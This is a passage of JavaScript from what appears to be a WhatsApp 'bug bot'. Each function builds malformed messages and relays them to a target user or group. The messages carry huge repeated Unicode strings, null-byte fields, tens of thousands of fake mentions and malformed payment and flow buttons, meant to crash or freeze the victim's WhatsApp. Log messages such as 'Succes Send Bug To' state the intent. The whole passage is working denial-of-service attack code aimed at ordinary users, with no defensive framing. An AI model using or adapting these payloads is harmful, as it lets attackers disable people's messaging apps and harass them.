      participant: "0@s.whatsapp.net",
      stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "0@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         }
 }, {});
 
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessageV2: {
      message: {
        listResponseMessage: {
          title: "💦💦💦💦😖" + "ꦾ",
          listType: 4,
          buttonText: { displayText: "🩸" },
          sections: [],
          singleSelectReply: {
            selectedRowId: "⌜⌟"
          },
          contextInfo: {
            mentionedJid: [target],
            participant: "0@s.whatsapp.net",
            remoteJid: "who know's ?",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60
              }
            },
            externalAdReply: {
              title: "☀️",
              body: "🩸",
              mediaType: 1,
              renderLargerThumbnail: false,
              nativeFlowButtons: [
                {
                  name: "payment_info",
                  buttonParamsJson: crash
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: crash
                },
              ],
            },
            extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "💦💦💦💦😖" +
                  "ꦾ࣯࣯".repeat(50000) +
                  "@1".repeat(20000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
           participant: target, 
          }
        }
      }
    }
  }, {})
  await devtrust.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Send Bug To ${target}`));
}

async function BugGb1(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "hokage" + "ꦾ".repeat(120000),
                        jpegThumbnail: "https://files.catbox.moe/e17h49.jpg",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "CYBER",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "XvoludUltra!",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function BugGb12(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `999999999999999999@newsletter`,
                        newsletterName: "GAME CHANGER" + "ꦾ".repeat(120000),
                        jpegThumbnail: "https://files.catbox.moe/laws24.jpg",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "minato!",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 10 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "XvoludUltra",
                    },
                ],
            },
        };

        await devtrust.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function xgroupnulL(target) {
         await devtrust.relayMessage(
                  target,
                  {
                           viewOnceMessage: {
                                    message: {
                                             interactiveResponseMessage: {
                                                      body: {
                                                               text: " XvoludUltra",
                                                               format: "DEFAULT"
                                                      },
                                                      nativeFlowResponseMessage: {
                                                               name: "call_permission_request",
                                                               paramsJson: "\u0000".repeat(1000000),
                                                               version: 3
                                                      }
                                             },
                                             contextInfo: {
                                                      mentionedJid: [
                                                               ...Array.from(
                                                                        { length: 1950 },
                                                                        () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                                                               )
                                                      ]
                                             }
                                    }
                           }
                  },
                  {}
         );
}

async function DelayGroup(target) {
    const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  await devtrust.sendMessage(target, {
    text: "XvoludUltra",
    mentions: target,
    contextInfo: {
      mentionedJid: mentionedList,
      isGroupMention: true
    }
  });
}

async function Xblanknoclick(target) {
  const ButtonsPush = [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({  
        title: "ꦽ".repeat(5000),
        sections: [
          {
            title: "\u0000",
            rows: [],
          },
        ],
      }),
    },
  ];
  
  for (let i = 0; i < 10; i++) {
    ButtonsPush.push(
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(5000),
        })
      },
      {
        name: "mpm",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          status: true
        })
      },
    );
  }
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ោ៝".repeat(20000),
              locationMessage: {
                degreesLatitude: 0,
                degreesLongtitude: 0,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "Hay" +
                "ꦽ".repeat(25000) +
                "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: ButtonsPush,
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "131338822@s.whatsapp.net",
                ...Array.from(
                  { length: 1900 },
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                ),
              ],
              remoteJid: "X",
              participant: target,
              stanzaId: "1234567890ABCDEF",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
              },
            },
          },
        },
      },
    },
    {}
  );
  
  await devtrust.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function XinsooInvisV1(target) {
  const msg1 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "\n".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "13527337@s.whastapp.net",
            ...Array.from(
              { length: 1900 },
              () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    },
    {}
  );
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "\n".repeat(9000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "13527337@s.whastapp.net",
            ...Array.from(
              { length: 1900 },
              () => "2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ),
          ],
        },
      },
    },
    {}
  );
  
  await devtrust.relayMessage(target, msg1.message, {
    messageId: msg1.key.id,
    participant: { jid: target },
  });
  await devtrust.sendMessage(target, {
    delete: msg1.key,
  });
 
  await devtrust.relayMessage(target, msg2.message, {
    messageId: msg2.key.id,
    participant: { jid: target },
  });
  await devtrust.sendMessage(target, {
    delete: msg2.key,
  });
}

async function LocaXotion(target) {
    await devtrust.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function forclose(target) {
  // Add rate limiting - CYBER't let this function be called too fast
  const now = Date.now();
  if (global.lastForclose && (now - global.lastForclose) < 5000) {
    console.log("⏱️ forclose called too soon, skipping");
    return;
  }
  global.lastForclose = now;
  
  // Add timeout to prevent hanging
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => reject(new Error("forclose timeout")), 10000);
  });
  
  try {
    // Check if target is valid
    if (!target || typeof target !== 'string') {
      console.error("❌ Invalid target for forclose");
      return;
    }
    
    // Check if messageKontol exists
    if (!messageKontol) {
      console.error("❌ messageKontol is not defined");
      return;
    }
    
    // Use Promise.race to add timeout
    await Promise.race([
      (async () => {
        const msg = generateWAMessageFromContent(target, {
          viewOnceMessage: {
            message: {
              extendedTextMessage: {
                text: "*CYBER Destroyed*",
                contextInfo: {
                  mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                  forwardingScore: 999,
                  isForwarded: false,
                  stanzaId: "FTG-EE62BD88F22C",
                  participant: "5521992999999@s.whatsapp.net",
                  remoteJid: target,
                  quotedMessage: {
                    callLogMessage: {
                      isVideo: false,
                      callOutcome: "1",
                      durationSecs: "0",
                      callType: "REGULAR",
                      participants: [
                        {
                          jid: target,
                          callOutcome: "1"
                        }
                      ]
                    }
                  }
                }
              }
            }
          }
        }, {
          quoted: messageKontol 
        });

        await devtrust.relayMessage(target, msg.message, {
          messageId: msg.key.id
        });
        
        console.log(chalk.green(`✅ forclose completed for ${target}`));
      })(),
      timeoutPromise
    ]);

  } catch (err) {
    console.error("❌ forclose error:", err.message);
    // CYBER't crash, just log the error
  }
}

//Quotednya

    
async function CarouselVY4(devtrust, target) {
  const img = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
    fileLength: "62265",
    height: 1080,
    width: 1080,
    mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
    fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };
  
  for (let i = 0; i < 5; i++) {
    const cards = [
      {
        header: {
          hasMediaAttachment: true,
          imageMessage: img,
          title: "\u2060".repeat(3000) + "You Hate Me? \n" + i
        },
        body: { text: "ꦾ".repeat(9999) },
        footer: { text: "Made by haters #1st" + i },
        nativeFlowMessage: {
          messageParamsJson: "",
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: "\u0000".repeat(1000)
            },
            {
              name: "cta_copy",
              buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
            },
            {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
            },
            {
              name: "galaxy_message",
              buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
            },
            {
              name: "payment_info",
              buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
            },
            {
              name: "payment_method",
              buttonParamsJson:
                "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
            }
          ]
        }
      }
    ];

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
            interactiveMessage: {
              body: { text: "ꦾ".repeat(9999) },
              footer: { text: "4izxvelzExerc1st." },
              header: { hasMediaAttachment: true, imageMessage: img },
              carouselMessage: { cards }
            },
            contextInfo: {
              remoteJid: "30748291653858@lid",
              participant: "0@s.whatsapp.net",
              mentionedJid: ["0@s.whatsapp.net"],
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://nekopoi.care",
                    unconsentedUsersUrl: "https://nekopoi.care",
                    consentedUsersUrl: "https://nekopoi.care",
                    cardIndex: 1
                  },
                  {
                    originalUrl: "https://nekopoi.care",
                    unconsentedUsersUrl: "https://nekopoi.care",
                    consentedUsersUrl: "https://nekopoi.care",
                    cardIndex: 2
                  }
                ]
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      },
      {}
    );

    await devtrust.relayMessage(target, msg.message, { messageId: msg.key.id });
    await new Promise(res => setTimeout(res, 500));
  }

  const msg2 = {
    extendedTextMessage: {
      text: "Infinite Here!!¿\n" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contextInfo: {
        fromMe: false,
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation: "4izxvelzExec1st" + "𑇂𑆵𑆴𑆿".repeat(900)
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  };

  await devtrust.relayMessage(
    target,
    msg2,
    { ephemeralExpiration: 5, timeStamp: Date.now() },
    { messageId: null }
  );

  const msg3 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "Infinite Ai¿",
        matchedText: "https://wa.me/13135550002?s=5",
        description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
        title: "xFlows Attack" + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    },
    { ephemeralExpiration: 5, timeStamp: Date.now() }
  );

  await devtrust.relayMessage(target, msg3.message, { messageId: msg3.key.id });
}

async function xatanicinvisv4(jid) {
    const delay = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "assalamualaikum",
                    listType: 2,
                    buttonText: null,
                    sections: delay,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "*CYBERt Bothering Me Bro!!*"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(jid, MSG, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // **Cek apakah mention true sebelum menjalankan relayMessage**
    if (jid) {
        await devtrust.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_jid: "soker tai" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

//===================================
async function protoXimg(isTarget, mention) {
    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    caption: "🧊 공격 KIM BAYU JIHON",
    fileSha256: "aA1/vATnQcXlUBaQ1oAyXOC6I6ZRVDSuHaYDMpNcGbU=",
    fileLength: "999999",
    height: 999999,
    width: 999999,
    mediaKey: "b9k58Kc4h6DdwrOWefVdr/aLwHzoxxSWrFQ8Pk2uCXk=",
    "fileEncSha256": "odx9UpoytXfE7ze2CgIPrJa0K4cCEN/DxFfjt/wKimM=",
    directPath: "/o1/v/t62.7118-24/f2/m239/AQPhVUy-GB8j4eMwShipMnnTvurfJ-2lkIwl_Ya7rekL5bEjm0tAUbVWDFWIa70k7ppNkK_sKaiC25pIktUWgZrpPPd2gqBYZQfXkOY6Yw?ccb=9-4&oh=01_Q5Aa1QGHR_S8_fwvzLDqk9tWHgKIrZpbVKM_MgGLjZ6qa6m7mg&oe=6840325D&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1746342199",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAADzxPj1na/bTkx0+uyOOpRoFho5MYb0pSXqr+8R2axtzHNSTAjbCZx2Voxvu3yxLLOQ0vPKsvCabknsXq602sq3Q41nR1MyeaxQB1wG35A1X0NhUMIAEf/EACMQAAIDAAIBBQEBAQAAAAAAAAECAAMREiEEEyIxQVFCFCP/2gAIAQEAAT8AA0ExQpHZi1fncHj4p3YaJ/mOaJxQf1GCMd2MoH3BmExACx4yipEUct0zimYNgrTT2eoBhzvJ5NCJjza/oGFRvX5ANDShDzEFbYNycSD8CGsjfaIq8l7XDL02sjBOXZHAR90QOiKfvZ4rKbAxjMioNJge1Ty64z1QQezKvJtNpBhIZeQPUuL8/aNBjqdBP5ErHHSZRXlkUCxO83JTU5c62icCLMCwVYxbAJbqowzqZZucpYGCnWlTD8JwT1MckA9j4lNuggqVlHkIjsr/ABsNlfzz6jWB7gFY5LLtfhpMsZUcMNjOnpguvZ+BK34gZmxH/wCjSwsoU/cI5b7eyYq7HKqF4r8SpGbmQPd8iMSM5CXOGXqKCfueEhN30ROD2nXwjTmQJWiEkDZ7QTnDRH3sCsdQcsA4Yf5Innhw+ExlcDdiaehKGNbg5o+xPVxgaxgjX2vy6E52nfaIHt9x/Rk9U/0SJ5LCxuWR26wz/8QAGxEAAgIDAQAAAAAAAAAAAAAAAAEQERIgITD/2gAIAQIBAT8AEikPmjGVFw3NmXh//8QAIhEBAAEDAwQDAAAAAAAAAAAAAQACESEQEjEDMkFRQpGh/9oACAEDAQE/ACnt4lj1Np6mLfGVFmbS1OS5CMyeX6vK8VOg/sY1I4Yq8uhVHqLrSQCWJYjP/9k=",
    scansSidecar: "kGPbOzyrXkA+tcRTlOjwO2d16WRC5j+U3wM0aULEpvWziWDL4AuVmQ==",
    scanLengths: [ 7566, 58200, 24715, 32660],
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 40000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "ᥬ🧊공식 ᥬNOCTURX 잘생긴" + "貍賳貎貏俳貍賳貎".repeat(100),
                                    title: "Yorxputz",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await devtrust.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }]
                    }
                ]
            }
        ]
    });

if (mention) {
        await devtrust.relayMessage(isTarget, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
}
//=================================
async function protoXvid(isTarget, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "🧊 공격 KIM BAYU JIHON" + "ោ៝".repeat(10000),
        title: "⇞ᥬ🧊공식 ᥬBAYU 잘생긴 ⇟",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "🧊 공격 *CYBER XMD*",
        height: 999999,
        width: 999999,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
